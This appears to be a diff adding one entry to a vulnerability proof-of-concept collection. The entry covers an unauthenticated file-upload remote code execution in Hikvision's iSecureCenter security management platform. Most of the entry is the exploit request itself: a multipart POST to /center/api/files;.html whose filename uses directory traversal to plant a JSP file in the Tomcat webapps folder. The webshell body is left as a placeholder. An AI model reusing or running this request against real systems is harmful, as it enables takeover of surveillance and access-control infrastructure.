@@ -1,0 +1,7 @@
+vendor = "海康威视"
+name = "海康威视iSecureCenter综合安防管理平台files前台上传命令执行"
+type = "RCE"
+source = "TG"
+date = "08.14"
+poc = "POST /center/api/files;.html HTTP/1.1Host: 10.10.10.10Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a ------WebKitFormBoundary9PggsiM755PLa54aContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components /tomcat85linux64.1/webapps/eportal/new.jsp\"Content-Type: application/zip <%jsp 的马%>------WebKitFormBoundary9PggsiM755PLa54a--"
+label = "nday"
